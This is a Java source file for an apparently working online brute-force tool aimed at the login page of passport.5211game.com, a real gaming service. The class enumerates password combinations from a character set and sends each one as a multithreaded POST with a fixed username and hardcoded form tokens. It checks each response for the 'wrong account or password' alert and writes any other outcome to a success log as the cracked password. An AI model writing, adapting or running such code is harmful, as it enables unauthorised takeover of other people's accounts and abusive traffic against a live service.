package com.l.h.y.fucklogin.Grade;

import java.io.File;
import java.io.FileWriter;
import java.util.ArrayList;
import java.util.HashMap;

import com.l.h.y.fucklogin.Grade.Item.IsMaxListener;
import com.l.h.y.fucklogin.Http.Bundle;
import com.l.h.y.fucklogin.Http.HttpJavaHandler;
import com.l.h.y.fucklogin.Utils.Contances;

public class Gun implements IsMaxListener {

	public static String baseUrl;
	public static Bundle params;

	static {

		baseUrl = "http://passport.5211game.com/11/t/login.aspx?siteid=50005&returnurl=http%3a%2f%2fi.5211game.com%2fLogin.aspx%3freturnurl%3dhttp%3a%2f%2fi.5211game.com%3a80%2f";
		params = new Bundle();
		params.putString("__VIEWSTATE", "/wEPDwULLTEyMzI3ODI2ODBkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQxVc2VyQ2hlY2tCb3jQIGg7DwVBcZCffRMxe03M18OedA==");
		params.putString("__EVENTVALIDATION", "/wEWBQLe2+mbAQLB2tiHDgK1qbSWCwL07qXZBgLmwdLFDZc2mILMY55IspHL6KQgO25sOuhz");
		params.putString("txtUser", Contances.USER_NAME);
		params.putString("butLogin", "登录");
		// params.putString("txtPassWord", value);

	}

	/**
	 * 密码序列
	 */
	char[] pwd = Grade.Grade4;
	/**
	 * 密码组合
	 */
	ArrayList<Item> list = new ArrayList<Item>();

	/**
	 * 密码长度
	 */
	public int pwdLength = pwd.length;
	/**
	 * 密码第一个字符
	 */
	char first;
	/**
	 * 密码最后一个字符
	 */
	char end;

	private int columSize = 0;

	/**
	 * 开始
	 */
	public void start() {
		init();

		for (int i = 0; i < columSize; i++) {

			list.add(createItem(i));
		}

		fuck();
	}

	public void init() {
		first = pwd[0];
		end = pwd[pwd.length - 1];
	}

	public void fuck() {
		int max = (int) Math.pow(pwd.length, list.size());
		for (int i = 0; i < max; i++) {

			StringBuilder sb = new StringBuilder();
			for (int j = list.size() - 1; j >= 0; j--) {

				sb.append(pwd[list.get(j).get()]);
			}
			requestInfo(sb.toString());

			try {
				list.get(0).add(pwdLength);
			} catch (Exception e) {
				writeCatch("Fuck Fuction Exception = " + "\nExceptionLHY = " + e.toString());
			}
			System.out.println();
		}
	}

	public Item createItem(int id) {
		Item item = new Item();
		item.setId(id);
		item.setMaxListener(this);
		return item;
	}

	@Override
	public void maxListener(int id) {
		if (id + 1 == list.size()) {
			return;
		}

		Item nextItem = list.get(id + 1);
		nextItem.add(pwdLength);

	}

	public int getColumSize() {
		return columSize;
	}

	public void setColumSize(int columSize) {
		this.columSize = columSize;
	}

	/**
	 * 访问网络
	 */
	public void requestInfo(String pwd) {

	
		createRequestThread(pwd);
	}

	/**
	 * 写入成功的密码
	 * 
	 * @param pwd
	 */
	public void writeSuccess(String pwd) {
		try {
			System.out.println("正确的密码--------------------");
			File successFolder = new File("success");
			if (!successFolder.exists()) {
				successFolder.mkdir();
			}
			FileWriter fw = new FileWriter(successFolder.getPath() + "/" + System.currentTimeMillis() + "success.log");
			fw.append("|" + pwd + "|");
			fw.flush();
			fw.close();
		} catch (Exception e) {
			writeCatch("PWD = " + pwd + "\nExceptionLHY = " + e.toString());
		} finally {
			System.exit(0);
		}
	}

	public static long currentTime;
	public static long roundTime = 1000 * 60 * 5;

	/**
	 * 写错误密码log
	 * 
	 * @param msg
	 */
	public void writeError(String msg) {
		System.out.println("错误的密码--------------------\n" + msg);
		try {
			if (System.currentTimeMillis() > currentTime + roundTime) {
				currentTime = System.currentTimeMillis();
				// 间隔5分钟写Errorlog
				File errorFolder = new File("Error");
				if (!errorFolder.exists()) {
					errorFolder.mkdir();
				}
				FileWriter fw = new FileWriter(errorFolder.getPath() + "/" + System.currentTimeMillis() + "error.log");
				fw.append("|" + msg + "|");
				fw.flush();
				fw.close();
			}
		} catch (Exception e) {
			writeCatch("MSG = " + msg + "\nExceptionLHY = " + e.toString());
		}
	}

	/**
	 * 程序出错次数
	 */
	public static int catchTimes;

	public void writeCatch(String msg) {
		catchTimes++;

		System.out.println("程序出错--------------------\n" + msg);
		try {
			File catchFolder = new File("Catch");
			if (!catchFolder.exists()) {
				catchFolder.mkdir();
			}
			FileWriter fw = new FileWriter(catchFolder.getPath() + "/" + System.currentTimeMillis() + "catch.log");
			fw.append("|" + msg + "|");
			fw.flush();
			fw.close();
		} catch (Exception e) {

			System.err.println("Exception = " + e.toString() + "\n" + msg);
		}

		if (catchTimes >= 10000) {
			System.exit(0);
		}
	}
	
	public static HashMap<Long, RequestThread> requestThreadList = new HashMap<Long, Gun.RequestThread>();
	
	public void createRequestThread(String pwd){
		
		while(requestThreadList.size() > 5){
			try {
				Thread.currentThread().sleep(20);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		long id = System.currentTimeMillis();
		RequestThread rThread = new RequestThread(id, pwd);
		rThread.start();
		requestThreadList.put(id, rThread);
		
	}
	
	public void removeThread(long id){
		requestThreadList.remove(id);
	}

	class RequestThread extends Thread {

		public long id;
		public String pwd;
		
		public RequestThread(long id, String pwd) {

			this.id = id;
			this.pwd = pwd;
		}

		@Override
		public void run() {
			super.run();
			try {
				params = new Bundle();
				params.putString("__VIEWSTATE", "/wEPDwULLTEyMzI3ODI2ODBkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQxVc2VyQ2hlY2tCb3jQIGg7DwVBcZCffRMxe03M18OedA==");
				params.putString("__EVENTVALIDATION", "/wEWBQLe2+mbAQLB2tiHDgK1qbSWCwL07qXZBgLmwdLFDZc2mILMY55IspHL6KQgO25sOuhz");
				params.putString("txtUser", Contances.USER_NAME);
				params.putString("butLogin", "登录");
				params.putString("txtPassWord", pwd);
				String reponse = HttpJavaHandler.doPost(baseUrl, params);
				if (reponse.contains("<script>alert('账号或密码错误');</script></form>")) {
					writeError("|" + pwd + "|\n\n" + reponse);
				} else {
					writeSuccess(pwd);
				}
			} catch (Exception e) {
				writeCatch("PWD = " + pwd + "\nExceptionLHY = " + e.toString());
			}

			removeThread(id);
		}
		
		
	}
}
